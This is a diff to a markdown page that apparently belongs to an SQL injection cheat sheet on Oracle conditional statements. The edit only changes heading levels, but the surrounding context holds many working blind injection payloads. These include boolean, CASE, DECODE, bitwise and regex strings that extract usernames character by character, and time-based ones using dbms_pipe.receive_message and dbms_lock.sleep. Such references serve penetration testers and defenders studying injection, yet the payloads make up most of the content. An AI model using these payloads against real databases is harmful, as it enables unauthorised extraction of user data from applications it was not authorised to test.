@@ -7,11 +7,9 @@ tags: ["conditional", "boolean", "case", "decode"]
 lastUpdated: 2025-03-15
 ---
 
-## Conditional Statements
-
 Conditional statements are fundamental for extracting information from Oracle databases, especially in blind SQL injection scenarios. Oracle provides several methods for implementing conditional logic, which can be leveraged to infer data even when direct output is not available.
 
-### Basic Conditional Operators
+## Basic Conditional Operators
 
 Oracle supports standard conditional operators and expressions:
 
@@ -22,7 +20,7 @@ Oracle supports standard conditional operators and expressions:
 | `IF-THEN-ELSE`     | PL/SQL conditional logic                        | `IF condition THEN action1; ELSE action2; END IF;`                |
 | `AND`, `OR`, `NOT` | Logical operators                               | `condition1 AND condition2`                                       |
 
-### Boolean-Based Injection
+## Boolean-Based Injection
 
 Boolean-based injection uses true/false conditions to extract information character by character:
 
@@ -37,7 +35,7 @@ Boolean-based injection uses true/false conditions to extract information charac
 ' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--
 ```
 
-### CASE Expressions
+## CASE Expressions
 
 The CASE statement provides powerful conditional logic:
 
@@ -52,7 +50,7 @@ The CASE statement provides powerful conditional logic:
 ' OR (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM users WHERE rownum=1)=97 THEN 1 ELSE 0 END)=1--
 ```
 
-### DECODE Function
+## DECODE Function
 
 DECODE is Oracle's proprietary conditional function:
 
@@ -67,7 +65,7 @@ DECODE is Oracle's proprietary conditional function:
 ' OR DECODE(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1),'a',1,'b',1,'c',1,0)=1--
 ```
 
-### Combining with Time Delays
+## Combining with Time Delays
 
 Conditional expressions become particularly useful when combined with time delays in blind scenarios:
 
@@ -79,9 +77,9 @@ Conditional expressions become particularly useful when combined with time delay
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### Boolean Blind Extraction
+### Boolean Blind Extraction
 
 ```sql
 -- Testing each bit of a character (faster than testing each possible ASCII value)
@@ -90,7 +88,7 @@ Conditional expressions become particularly useful when combined with time delay
 ' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 4)=4--
 ```
 
-#### Time-Based Blind Extraction
+### Time-Based Blind Extraction
 
 ```sql
 -- Using dbms_pipe.receive_message
@@ -100,16 +98,16 @@ Conditional expressions become particularly useful when combined with time delay
 ' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_lock.sleep(10) ELSE dbms_lock.sleep(0) END)=0--
 ```
 
-#### Inferring Multiple Bits
+### Inferring Multiple Bits
 
 ```sql
 -- Testing multiple bits at once
 ' OR (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) BETWEEN 97 AND 122) THEN 1 ELSE 0 END)=1--
 ```
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Using Regular Expressions
+### Using Regular Expressions
 
 Oracle's regular expression support can be combined with conditionals:
 
@@ -121,7 +119,7 @@ Oracle's regular expression support can be combined with conditionals:
 ' OR (CASE WHEN REGEXP_LIKE((SELECT username FROM users WHERE rownum=1),'^[a-d]') THEN 1 ELSE 0 END)=1--
 ```
 
-#### Using NVL and NULLIF
+### Using NVL and NULLIF
 
 ```sql
 -- NVL for handling NULL values
@@ -131,7 +129,7 @@ Oracle's regular expression support can be combined with conditionals:
 ' OR NULLIF((SELECT COUNT(*) FROM users),0) IS NOT NULL--
 ```
 
-#### Conditional Subqueries
+### Conditional Subqueries
 
 ```sql
 -- Condition in subquery
@@ -141,7 +139,7 @@ Oracle's regular expression support can be combined with conditionals:
 ' OR 97 = ANY(SELECT ASCII(SUBSTR(username,1,1)) FROM users)--
 ```
 
-### Multi-Condition Tests
+## Multi-Condition Tests
 
 ```sql
 -- Testing multiple conditions
@@ -152,7 +150,7 @@ Oracle's regular expression support can be combined with conditionals:
     THEN 1 ELSE 0 END)=1--
 ```
 
-### Error Handling in Conditionals
+## Error Handling in Conditionals
 
 ```sql
 -- Using exception handling with conditions
